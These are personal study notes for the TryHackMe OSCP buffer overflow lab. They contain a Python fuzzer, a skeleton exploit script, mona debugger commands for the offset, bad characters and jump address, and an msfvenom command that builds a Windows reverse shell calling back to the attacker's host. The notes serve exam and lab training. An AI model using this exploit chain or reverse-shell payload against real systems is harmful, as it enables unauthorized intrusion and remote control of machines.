# Buffer Overflow Prep

{% embed url="https://infosecwriteups.com/tryhackme-oscp-buffer-overflow-prep-overflow-2-57c22b51a91f" %}

Install the mona script in the debugger directory and set the working folder

```
!mona config -set workingfolder c:\mona\%p
```

```
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

After fuzzing&#x20;

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <fuzz crash+400>
```

then put this as payload in exploit script

```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```



```
!mona findmsp -distance <fuzz crash+400>
```

To confirm, update return var to "BBBB" and your EIP should be showing 42424242 (42 is hex for B)

### Find bad characters

generate charset in immunity to compare to whatever payload we send which will eventually got modified (\x00 is default considered bad)

```
!mona bytearray -b "\x00"

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

This the new payload, run it and note the ESP (-a, this changes every time so pay attention)

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

This will show the potential bad chars, update in your payload as well as the bytearray generated by mona. Do it till you get no modified chars

Now find a jump point to return/direct the instruction yfm

```
!mona jmp -r esp -cpb "\x00"
```

Pick any address and mention that in your retn var (little endian watch out)

Payload generation can we do this wo meta check cus we can only use it once for oscp ye

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

Finally we add padding

```
padding = "\x90" * 16 (\x90 is No operation byte, might be encoded so need extra space to unpack)
```
